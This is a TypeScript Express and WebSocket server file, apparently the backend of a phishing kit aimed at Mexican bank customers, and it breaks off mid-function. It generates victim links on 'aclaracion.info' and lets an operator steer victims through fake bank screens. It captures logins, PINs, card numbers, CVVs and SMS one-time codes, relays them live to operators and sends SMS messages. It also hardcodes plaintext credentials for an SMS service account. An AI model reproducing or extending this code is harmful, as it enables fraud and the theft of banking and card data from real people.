import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema } from "@shared/schema";
import { setupAuth } from "./auth";
import axios from 'axios';

// Store active connections
const clients = new Map<string, WebSocket>();
const adminClients = new Set<WebSocket>();

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication
  setupAuth(app);

  // Create HTTP server
  const httpServer = createServer(app);

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // Configurar limpieza periódica de sesiones antiguas
  setInterval(async () => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();
      if (deletedCount > 0) {
        console.log(`Limpieza automática: ${deletedCount} sesiones antiguas eliminadas (>5 días)`);
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { deletedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de sesiones:', error);
    }
  }, 12 * 60 * 60 * 1000); // Ejecutar cada 12 horas

  // Configurar limpieza periódica de usuarios expirados
  setInterval(async () => {
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      if (deactivatedCount > 0) {
        console.log(`Limpieza automática: ${deactivatedCount} usuarios expirados desactivados`);
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { deactivatedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de usuarios:', error);
    }
  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas

  // API endpoints
  // Rutas de administración de usuarios
  app.post('/api/admin/users', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.createAdminUser(username, password);
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(400).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.validateAdminUser(username, password);
      if (!user) {
        return res.status(401).json({ success: false, message: "Credenciales inválidas" });
      }

      // Actualizamos la última fecha de inicio de sesión
      await storage.updateUserLastLogin(user.id);

      // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
      res.cookie('auth_token', username, { 
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 1 día
      });

      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/logout', async (req, res) => {
    try {
      // Limpiar la cookie de autenticación
      res.clearCookie('auth_token');
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/users/:username/toggle', async (req, res) => {
    try {
      const { username } = req.params;
      const success = await storage.toggleAdminUserStatus(username);
      if (!success) {
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/users', async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      res.json(users.map((user: User) => ({ ...user, password: undefined })));
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Ruta para obtener usuarios regulares (solo para el usuario "balonx")
  app.get('/api/users/regular', async (req, res) => {
    console.log('[API] Solicitud para obtener usuarios regulares');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    console.log(`[API] Usuario actual: ${user.username}, rol: ${user.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (user.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      console.log('[API] Obteniendo lista de usuarios regulares');
      const users = await storage.getAllUsers();
      const regularUsers = users.filter(user => user.role === UserRole.USER);
      console.log(`[API] Encontrados ${regularUsers.length} usuarios regulares`);

      // Mostrar detalles de usuarios para depuración
      regularUsers.forEach(user => {
        console.log(`[API] Usuario: ${user.username}, Activo: ${user.isActive}, Expira: ${user.expiresAt || 'No establecido'}`);
      });

      const usersList = regularUsers.map((user: User) => ({ 
        id: user.id,
        username: user.username,
        role: user.role,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        deviceCount: user.deviceCount,
        maxDevices: user.maxDevices,
        allowedBanks: user.allowedBanks || 'all',
        createdAt: user.createdAt,
        lastLogin: user.lastLogin
      }));

      res.json(usersList);
    } catch (error: any) {
      console.log(`[API] Error al obtener usuarios: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/toggle-status', async (req, res) => {
    console.log('[API] Solicitud para alternar estado de usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando alternar estado del usuario: ${username}`);

      const success = await storage.toggleUserStatus(username);
      if (!success) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Obtener el usuario actualizado
      const updatedUser = await storage.getUserByUsername(username);
      if (!updatedUser) {
        return res.status(404).json({ message: "Usuario no encontrado después de actualización" });
      }

      console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          createdAt: updatedUser.createdAt,
          lastLogin: updatedUser.lastLogin
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al alternar estado de usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 1 día (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 1 día');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;
      
      // Activar el usuario con la fecha de expiración
      const user = await storage.activateUserForOneDay(username);
      
      // Si se proporcionaron bancos permitidos, actualizarlos
      if (allowedBanks) {
        // Actualizar el usuario con los bancos permitidos
        const updatedUser = { 
          ...user, 
          allowedBanks: typeof allowedBanks === 'string' ? allowedBanks : 'all'
        };
        
        // Guardar los cambios
        await storage.updateUser(user.id, updatedUser);
        
        console.log(`[API] Bancos permitidos para ${username}: ${updatedUser.allowedBanks}`);
        user.allowedBanks = updatedUser.allowedBanks;
      }
      
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);

      res.json({ 
        success: true, 
        user: {
          id: user.id,
          username: user.username,
          role: user.role,
          isActive: user.isActive,
          expiresAt: user.expiresAt,
          deviceCount: user.deviceCount,
          maxDevices: user.maxDevices,
          allowedBanks: user.allowedBanks || 'all'
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 7 días (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 7 días');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;
      
      // Activar el usuario con la fecha de expiración
      const user = await storage.activateUserForSevenDays(username);
      
      // Si se proporcionaron bancos permitidos, actualizarlos
      if (allowedBanks) {
        // Actualizar el usuario con los bancos permitidos
        const updatedUser = { 
          ...user, 
          allowedBanks: typeof allowedBanks === 'string' ? allowedBanks : 'all'
        };
        
        // Guardar los cambios
        await storage.updateUser(user.id, updatedUser);
        
        console.log(`[API] Bancos permitidos para ${username}: ${updatedUser.allowedBanks}`);
        user.allowedBanks = updatedUser.allowedBanks;
      }
      
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);

      res.json({ 
        success: true, 
        user: {
          id: user.id,
          username: user.username,
          role: user.role,
          isActive: user.isActive,
          expiresAt: user.expiresAt,
          deviceCount: user.deviceCount,
          maxDevices: user.maxDevices,
          allowedBanks: user.allowedBanks || 'all'
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Desactivar usuarios expirados (se puede llamar manualmente o mediante un cron job)
  app.post('/api/users/cleanup-expired', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      res.json({ success: true, deactivatedCount });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Eliminar un usuario (solo usuario "balonx" puede hacerlo)
  app.delete('/api/users/regular/:username', async (req, res) => {
    console.log('[API] Solicitud para eliminar usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    const { username } = req.params;

    // No permitir eliminar al usuario admin "balonx"
    if (username === "balonx") {
      console.log('[API] Error: No se puede eliminar al usuario admin "balonx"');
      return res.status(403).json({ message: "No se puede eliminar al usuario administrador principal" });
    }

    try {
      console.log(`[API] Intentando eliminar usuario: ${username}`);
      const deleted = await storage.deleteUser(username);

      if (!deleted) {
        console.log(`[API] Error: Usuario ${username} no encontrado`);
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }

      console.log(`[API] Usuario eliminado con éxito: ${username}`);
      res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });
    } catch (error: any) {
      console.log(`[API] Error al eliminar usuario: ${error.message}`);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/user', async (req, res) => {
    try {
      // Obtener el username de la cookie de autenticación
      const username = req.cookies?.auth_token;
      if (!username) {
        return res.status(401).json({ message: "No autorizado" });
      }

      // Buscar el usuario por nombre de usuario
      const user = await storage.getUserByUsername(username);
      if (!user) {
        return res.status(401).json({ message: "Usuario no encontrado" });
      }

      // Verificar si el usuario está activo
      if (!user.isActive) {
        return res.status(403).json({ message: "Usuario inactivo" });
      }

      // Devolver el usuario sin la contraseña
      res.json({ ...user, password: undefined });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.get('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const { type = 'current' } = req.query;
      const user = req.user;

      let sessions;
      if (type === 'saved') {
        sessions = await storage.getSavedSessions();
      } else if (type === 'all') {
        sessions = await storage.getAllSessions();
      } else {
        sessions = await storage.getCurrentSessions();
      }
      
      // Si el usuario no es administrador, filtrar para mostrar solo sus propias sesiones
      if (user.role !== 'admin') {
        sessions = sessions.filter(session => session.createdBy === user.username);
      }

      res.json(sessions);
    } catch (error) {
      console.error("Error fetching sessions:", error);
      res.status(500).json({ message: "Error fetching sessions" });
    }
  });

  app.post('/api/sessions', async (req, res) => {
    try {
      const { banco = "Invex" } = req.body;
      const sessionId = nanoid(10);
      const session = await storage.createSession({ 
        sessionId, 
        banco,
        folio: nanoid(6),
        pasoActual: ScreenType.FOLIO,
      });
      res.json(session);
    } catch (error) {
      console.error("Error creating session:", error);
      res.status(500).json({ message: "Error creating session" });
    }
  });

  app.post('/api/sessions/:id/update', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.updateSession(id, req.body);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(500).json({ message: "Error updating session" });
    }
  });

  // Endpoint para guardar una sesión
  app.post('/api/sessions/:id/save', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.saveSession(id);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error saving session:", error);
      res.status(500).json({ message: "Error saving session" });
    }
  });

  // Endpoint para eliminar una sesión
  app.delete('/api/sessions/:id', async (req, res) => {
    try {
      const { id } = req.params;
      const success = await storage.deleteSession(id);

      if (success) {
        // Notify all admin clients
        broadcastToAdmins(JSON.stringify({
          type: 'SESSION_DELETE',
          data: { sessionId: id }
        }));

        res.json({ success: true });
      } else {
        res.status(404).json({ success: false, message: "Session not found" });
      }
    } catch (error) {
      console.error("Error deleting session:", error);
      res.status(500).json({ message: "Error deleting session" });
    }
  });

  // Endpoint para limpiar sesiones expiradas (más de 5 días)
  app.post('/api/cleanup-sessions', async (req, res) => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();

      // Notify all admin clients to refresh their session list
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_CLEANUP',
        data: { deletedCount }
      }));

      res.json({ success: true, deletedCount });
    } catch (error) {
      console.error("Error cleaning up sessions:", error);
      res.status(500).json({ message: "Error cleaning up sessions" });
    }
  });

  app.get('/api/generate-link', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const { banco = "LIVERPOOL" } = req.query;
      const sessionId = nanoid(10);
      const user = req.user;
      
      // Eliminamos la validación del banco seleccionado para permitir a cualquier usuario
      // generar enlaces para cualquier banco

      // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
      const generateSixDigitCode = () => {
        // Genera números aleatorios entre 0-9 para cada posición
        let code = '';
        for (let i = 0; i < 6; i++) {
          code += Math.floor(Math.random() * 10).toString();
        }
        return code;
      };

      const sixDigitCode = generateSixDigitCode();

      const session = await storage.createSession({ 
        sessionId, 
        banco: banco as string,
        folio: sixDigitCode,
        pasoActual: ScreenType.FOLIO,
        createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
      });

      // Usar el dominio aclaracion.info según la solicitud del usuario
      const domain = 'aclaracion.info';

      // Armamos el enlace final - usando el dominio en producción
      const link = `https://${domain}/client/${sessionId}`;

      console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
      console.log(`URL del cliente: ${link}`);
      console.log(`Generado por usuario: ${user.username}`);

      // Notificar a los clientes de admin sobre el nuevo enlace
      broadcastToAdmins(JSON.stringify({
        type: 'LINK_GENERATED',
        data: { 
          sessionId,
          code: sixDigitCode,
          banco: banco as string,
          userName: user.username
        }
      }));

      res.json({ 
        sessionId, 
        link, 
        code: sixDigitCode
      });
    } catch (error) {
      console.error("Error generating link:", error);
      res.status(500).json({ message: "Error generating link" });
    }
  });

  // WebSocket handling
  wss.on('connection', (ws, req) => {
    console.log('New WebSocket connection');

    // Handle client/admin identification
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());

        // Register client or admin
        if (data.type === 'REGISTER') {
          if (data.role === 'ADMIN') {
            adminClients.add(ws);
            console.log('Admin client registered');
            
            // Determinar si es un administrador o un usuario basado en el username
            const userName = data.username || '';
            const user = await storage.getUserByUsername(userName);
            let sessions = await storage.getCurrentSessions();
            
            // Si no es admin, filtrar para mostrar solo sus propias sesiones
            if (user && user.role !== 'admin') {
              console.log(`Usuario ${userName} no es admin, filtrando sesiones`);
              sessions = sessions.filter(session => session.createdBy === userName);
            }
            
            ws.send(JSON.stringify({
              type: 'INIT_SESSIONS',
              data: sessions
            }));

            // Run cleanup of old sessions (more than 5 days)
            try {
              const deletedCount = await storage.cleanupExpiredSessions();
              if (deletedCount > 0) {
                console.log(`Cleaned up ${deletedCount} expired sessions`);
                broadcastToAdmins(JSON.stringify({
                  type: 'SESSIONS_CLEANUP',
                  data: { deletedCount }
                }));
              }
            } catch (error) {
              console.error("Error cleaning up expired sessions:", error);
            }
          } 
          else if (data.role === 'CLIENT' && data.sessionId) {
            clients.set(data.sessionId, ws);
            console.log(`Client registered with session ID: ${data.sessionId}`);

            // Get session info and send to client
            const session = await storage.getSessionById(data.sessionId);
            if (session) {
              ws.send(JSON.stringify({
                type: 'INIT_SESSION',
                data: session
              }));
            }
          }
          return;
        }

        // Handle screen change request from admin
        if (data.type === 'SCREEN_CHANGE') {
          try {
            // Validate the data
            const validatedData = screenChangeSchema.parse(data.data);
            const { sessionId, tipo } = validatedData;

            // Find the target client
            const client = clients.get(sessionId);
            if (client && client.readyState === WebSocket.OPEN) {
              // Send the screen change command to the client
              client.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: validatedData
              }));

              // Update session in storage with the new screen state
              // Remove "mostrar_" prefix from tipo if present
              let screenType = tipo.replace('mostrar_', '');

              // Normalizar screenType para SMS_COMPRA
              if (screenType.toLowerCase() === 'sms_compra' || 
                  screenType.toLowerCase() === 'smscompra' ||
                  screenType.toLowerCase() === 'sms compra') {
                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
                screenType = ScreenType.SMS_COMPRA;
              }

              await storage.updateSession(sessionId, { pasoActual: screenType });
              console.log('Actualizado pasoActual a:', screenType);

              // Notify all admin clients about the update
              const updatedSession = await storage.getSessionById(sessionId);
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }));
            }
          } catch (error) {
            console.error("Invalid screen change data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid screen change data" 
            }));
          }
          return;
        }

        // Handle client input data
        if (data.type === 'CLIENT_INPUT') {
          try {
            // Validate the data
            const validatedData = clientInputSchema.parse(data.data);
            const { sessionId, tipo, data: inputData } = validatedData;

            // Update the session with the new data
            const updatedFields: Record<string, any> = {};

            switch (tipo) {
              case 'folio':
                updatedFields.folio = inputData.folio;
                break;
              case 'login':
                updatedFields.username = inputData.username;
                updatedFields.password = inputData.password;
                break;
              case 'codigo':
                updatedFields.sms = inputData.codigo;
                break;
              case 'nip':
                updatedFields.nip = inputData.nip;
                break;
              case 'tarjeta':
                updatedFields.tarjeta = inputData.tarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                if (inputData && inputData.smsCompra) {
                  updatedFields.smsCompra = inputData.smsCompra;
                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);

                  // Notificar a los administradores el código de cancelación inmediatamente
                  broadcastToAdmins(JSON.stringify({
                    type: 'SMS_COMPRA_CODE',
                    data: {
                      sessionId,
                      code: inputData.smsCompra
                    }
                  }));
                } else {
                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                }
                break;
              case 'celular':
                updatedFields.celular = inputData.celular;
                break;
            }

            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);

            // No enviamos notificaciones en tiempo real
            // Mejora solicitada: Eliminar notificaciones en tiempo real
            console.log('Notificación en tiempo real suprimida por cambio de requisitos');

            // Update session if we have fields to update
            if (Object.keys(updatedFields).length > 0) {
              const updatedSession = await storage.updateSession(sessionId, updatedFields);

              // Notify all admin clients about the database update
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }));
            }
          } catch (error) {
            console.error("Invalid client input data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid client input data" 
            }));
          }
          return;
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    });

    // Handle disconnection
    ws.on('close', () => {
      // Remove from admin clients if it was an admin
      if (adminClients.has(ws)) {
        adminClients.delete(ws);
        console.log('Admin client disconnected');
      }

      // Remove from clients if it was a client
      Array.from(clients.entries()).forEach(([sessionId, client]) => {
        if (client === ws) {
          clients.delete(sessionId);
          console.log(`Client with session ID ${sessionId} disconnected`);
        }
      });
    });
  });

  // === API de SMS ===

  // Obtener la configuración actual de la API de SMS
  app.get('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const config = await storage.getSmsConfig();
      // Si hay una config, ocultamos las credenciales por seguridad, solo mostramos si están activas
      if (config) {
        res.json({
          isActive: config.isActive,
          updatedAt: config.updatedAt,
          updatedBy: config.updatedBy,
          hasCredentials: !!(config.username && config.password), // Verificar si hay credenciales configuradas
          apiUrl: config.apiUrl || 'https://api.sofmex.mx/api/sms'
        });
      } else {
        res.json({
          isActive: false,
          hasCredentials: false,
          apiUrl: 'https://api.sofmex.mx/api/sms',
          updatedAt: null,
          updatedBy: null
        });
      }
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Actualizar la configuración de la API de SMS
  app.post('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      // Solo usuario administrador puede actualizar la configuración
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración de API" });
      }

      // Verificamos si es un modo de simulación
      const apiUrl = req.body.apiUrl || 'https://api.sofmex.mx/api/sms';
      const simulationMode = apiUrl && (apiUrl.includes('simulacion') || apiUrl.includes('localhost'));

      // Usar las credenciales proporcionadas o las predeterminadas
      const username = req.body.username || 'josemorenofs19@gmail.com';
      const password = req.body.password || 'Balon19@';
      
      // La API está activa si está en modo simulación o si tiene credenciales válidas
      const hasValidCredentials = simulationMode || (!!username && !!password);
      const isActive = hasValidCredentials;
      
      // Si no estamos en modo simulación y faltan credenciales, advertimos pero seguimos
      let credentialsWarning = '';
      if (!simulationMode && (!username || !password)) {
        credentialsWarning = "Advertencia: No has proporcionado credenciales válidas para el modo real.";
      }

      const data = insertSmsConfigSchema.parse({
        username: username,
        password: password,
        apiUrl: apiUrl,
        isActive: isActive,
        updatedBy: user.username
      });

      const config = await storage.updateSmsConfig(data);

      // Respuesta adicional para el modo simulación
      const response: {
        isActive: boolean | null;
        updatedAt: Date | null;
        updatedBy: string;
        hasCredentials: boolean;
        apiUrl: string | null;
        success: boolean;
        message?: string;
      } = {
        isActive: config.isActive,
        updatedAt: config.updatedAt,
        updatedBy: config.updatedBy,
        hasCredentials: hasValidCredentials,
        apiUrl: config.apiUrl,
        success: true
      };

      if (simulationMode) {
        console.log("API de SMS configurada en modo simulación:", config.apiUrl);
        response.message = "API configurada en modo simulación. Los mensajes serán enviados solo de manera simulada.";
      }

      res.json(response);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener los créditos SMS del usuario actual
  app.get('/api/sms/credits', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const credits = await storage.getUserSmsCredits(user.id);
      res.json({ credits });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Agregar créditos a un usuario (solo admin)
  app.post('/api/sms/credits/:userId', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden agregar créditos
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden agregar créditos" });
      }

      const userId = parseInt(req.params.userId);
      const { amount } = req.body;

      if (!amount || amount <= 0) {
        return res.status(400).json({ message: "La cantidad debe ser un número positivo" });
      }

      const smsCredits = await storage.addSmsCredits(userId, amount);
      res.json({
        success: true,
        credits: smsCredits.credits,
        message: `Se han agregado ${amount} créditos. Total: ${smsCredits.credits}`
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Enviar un SMS
  app.post('/api/sms/send', async (req, res) => {
    try {
      console.log("Recibida solicitud de envío de SMS");
      
      if (!req.isAuthenticated()) {
        console.log("Error: Usuario no autenticado");
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      console.log(`Usuario: ${user.username}, Role: ${user.role}`);
      
      const config = await storage.getSmsConfig();
      console.log("Configuración SMS:", config);

      // Verificar si la API está configurada
      if (!config || !config.isActive) {
        console.log("Error: API no configurada o inactiva");
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no está configurada o está inactiva" 
        });
      }

      // Verificar si está en modo simulación (con la URL simple 'simulacion')
      const simulationMode = config.apiUrl === 'simulacion' || 
                          (config.apiUrl && (config.apiUrl.includes('simulacion') || config.apiUrl.includes('localhost')));
      
      console.log("Modo simulación detectado:", simulationMode);

      // En modo simulación no necesitamos credenciales válidas, pero en modo real sí
      const hasValidCredentials = simulationMode || (!!config.username && !!config.password);
      
      // Si no estamos en modo simulación y no tenemos credenciales válidas, no podemos enviar
      if (!hasValidCredentials) {
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no tiene credenciales configuradas. Ve a Configuración y proporciona un usuario y contraseña válidos." 
        });
      }

      // Verificar si el usuario tiene créditos (solo para usuarios regulares)
      // Los administradores no necesitan créditos para enviar SMS
      if (user.role !== UserRole.ADMIN) {
        const hasCredits = await storage.useSmsCredit(user.id);
        if (!hasCredits) {
          return res.status(400).json({ 
            success: false, 
            message: "No tienes créditos suficientes para enviar un SMS" 
          });
        }
      }

      // Validar los datos del SMS
      const { phoneNumber, message, sessionId } = req.body;
      
      console.log("Datos de SMS a enviar:", { phoneNumber, messageLength: message?.length || 0, sessionId });

      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono" 
        });
      }
      
      // Permitir mensaje vacío para mayor flexibilidad
      const messageContent = message || "Mensaje de prueba";

      // Preparar los datos para el historial
      const smsData = insertSmsHistorySchema.parse({
        userId: user.id,
        phoneNumber,
        message: messageContent,
        sessionId: sessionId || null
      });

      // Guardar en el historial como pendiente
      const smsRecord = await storage.addSmsToHistory(smsData);

      // Verificar si estamos en modo simulación antes de continuar
      if (simulationMode) {
        console.log("Detectado modo simulación - Procesando SMS simulado");
        // Actualizar el registro como enviado (simulado)
        await storage.updateSmsStatus(smsRecord.id, 'sent');
        
        return res.json({
          success: true,
          message: "Mensaje enviado correctamente (simulado)",
          smsId: smsRecord.id,
          simulated: true
        });
      }
      
      // Implementación real de la API de Sofmex (sólo se ejecuta si no estamos en modo simulación)
      try {
        // Primero verificamos que tengamos una configuración
        if (!config) {
          throw new Error("Configuración de API no encontrada");
        }
        
        const username = config.username || 'josemorenofs19@gmail.com';
        const password = config.password || 'Balon19@';
        
        // Ajustar URL base según la documentación oficial de SofMex
        const apiUrl = config.apiUrl || 'https://api.sofmex.mx';
        
        // URL específica para envío de SMS según la documentación de SofMex
        // Consultar correctamente la documentación en https://api.sofmex.mx/api/swagger-ui/index.html
        
        // Telegram funciona con esta URL, así que usemos el mismo formato
        let smsApiUrl = 'https://api.sofmex.mx/smssend';
        console.log("Usando URL para API de SofMex:", smsApiUrl);
        
        // Ya no usamos autenticación básica en los headers porque pasamos los datos
        // directamente en el cuerpo de la solicitud
        
        // Formato del cuerpo según el formato que espera la API
        const requestData = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            numero: phoneNumber,             // El número de teléfono 
            mensaje: messageContent,         // El mensaje a enviar
            usuario: username,               // Usuario para autenticación
            password: password               // Contraseña para autenticación
          })
        };

        console.log("Enviando SMS a través de la API:", {
          url: smsApiUrl,
          phone: phoneNumber,
          messageLength: messageContent.length
        });

        try {
          console.log("Intentando conectar a:", smsApiUrl);
          // Ocultar la contraseña en los logs para seguridad
          const logData = JSON.parse(requestData.body as string);
          const redactedData = {
              ...logData,
              password: "[CONTRASEÑA_OCULTA]"
          };
          
          console.log("Datos de la solicitud:", {
            method: requestData.method,
            headers: requestData.headers,
            datos: redactedData
          });

          // Ya verificamos el modo simulación arriba, así que este bloque es innecesario
